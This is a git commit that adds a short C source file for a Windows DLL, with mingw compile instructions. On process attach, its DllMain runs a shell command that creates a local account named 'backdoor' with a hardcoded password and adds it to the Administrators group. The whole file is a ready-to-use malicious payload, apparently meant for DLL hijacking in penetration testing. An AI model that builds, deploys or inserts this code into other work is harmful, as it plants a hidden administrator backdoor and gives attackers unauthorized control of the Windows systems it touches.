0034c3149c8372a2202efab9f1097292b7fbe8d3
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-11 12:40:40 +0100

    Add files via upload

---
+++ windows_dll.c
@@ -0,0 +1,12 @@
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /c net user /add backdoor B@ckd00r123 && net localgroup administrators backdoor /add");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
